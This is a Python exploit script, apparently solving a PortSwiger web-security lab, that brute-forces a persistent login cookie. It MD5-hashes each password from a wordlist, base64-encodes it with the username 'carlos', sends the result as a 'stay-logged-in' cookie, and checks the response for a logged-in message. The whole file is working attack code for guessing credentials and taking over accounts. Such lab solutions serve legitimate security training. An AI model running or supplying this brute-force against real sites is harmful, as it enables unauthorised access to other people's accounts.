import requests # Import the requests module to send requests
import hashlib # Import hashlib to hash the password
import base64 # Import base64 to encode the password
import sys # Import sys to pass arguments

if len(sys.argv) != 3 :
    print ("Usage : python3 exploit.py <URL> <Wordlist>")
    exit()

url = sys.argv[1] # Pass the lab URL as the 1st argument
password_list = sys.argv[2] # Pass the passwords wordlist file given by PortSwiger as the 2nd argument

def start():   
    with open(password_list, 'r') as file: # Change this with your passwords wordlist file path
        credential = file.readlines()

    credential = [i.strip() for i in credential] # Remove any whitespace or newline characters
    
    for i in credential:
        # Generate MD5 hash of the password
        hashed_password = hashlib.md5(i.encode()).hexdigest()
        
        # Encode 'carlos' username in base64 with the hashed password
        password = base64.b64encode(f'carlos:{hashed_password}'.encode()).decode()
        
        # Create headers with the encoded password
        headers = {
            'Cookie': 'stay-logged-in=' + password
            }
        
        # Send POST request
        with requests.post(url, headers=headers) as req:
            response_content = req.text # Get the response content
        
        # Check if the response contains any success message
        if 'Your username is:' in response_content:            
            print(f'## {i} ==> Succeeded! ##')
            return  # Exit once credentials are found
        else:            
            print(f'- {i} ==> Invalid')
            
start()
